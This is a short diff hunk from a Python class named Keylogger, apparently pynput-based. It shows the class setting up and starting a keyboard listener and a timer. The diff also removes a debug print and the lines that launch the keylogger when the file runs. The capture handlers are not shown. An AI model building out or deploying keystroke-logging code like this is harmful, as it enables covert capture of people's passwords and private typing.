@@ -59,9 +59,5 @@ class Keylogger:
         self.teller = random.randint(0,10000000)
         self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
         self.timer.start()        
-        print(self.teller)
         self.listener.start()
         self.listener.join()
-
-k = Keylogger()
-k.keylogger()
